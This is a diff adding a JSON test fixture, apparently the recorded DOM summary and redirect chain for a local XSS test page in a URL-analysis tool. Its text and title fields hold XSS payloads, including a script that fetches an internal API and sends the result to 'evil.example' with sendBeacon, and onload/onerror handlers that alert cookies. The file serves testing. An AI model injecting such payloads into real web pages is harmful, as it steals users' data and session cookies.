@@ -1,0 +1,24 @@
+{
+ "dom_summary": {
+  "final_url": "http://testsites:8080/xss-title.html",
+  "forms": [],
+  "iframes": 0,
+  "links": 0,
+  "meta_refresh": "",
+  "password_inputs": 0,
+  "schema": "dom_summary/1",
+  "text_excerpt": "<script>fetch('/api/v1/cases').then(r=>r.text()).then(t=>navigator.sendBeacon('//evil.example',t))</script>\n\n\"><svg onload=alert(document.cookie)>",
+  "title": "<img src=x onerror=alert('xss')><script>alert(1)</script>"
+ },
+ "redirect_chain": {
+  "final_url": "http://testsites:8080/xss-title.html",
+  "hops": [
+   {
+    "blocked": null,
+    "status": 200,
+    "url": "http://testsites:8080/xss-title.html"
+   }
+  ],
+  "schema": "redirect_chain/1"
+ }
+}
